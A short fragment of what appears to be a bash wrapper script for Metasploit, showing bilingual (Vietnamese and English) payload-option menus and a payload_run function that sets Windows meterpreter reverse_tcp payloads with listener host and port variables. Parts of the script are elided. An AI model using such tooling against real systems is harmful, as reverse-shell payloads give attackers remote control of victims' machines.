...
no="     Không "
cat << !
Các tùy chọn của tải trọng (windows/auto/meterpreter/reverse_tcp):
...
no="     no "
cat << !
Payload options (windows/auto/meterpreter/reverse_tcp):
...
function payload_run {
	paylo="windows/auto/meterpreter/reverse_tcp"
	paylo1="windows/meterpreter/reverse_tcp"
	paylo2="windows/x64/meterpreter/reverse_tcp"
	lhost=$lhost
	lport1=$lport1
	lport2=$lport2
	exitfunc=$exitfunc
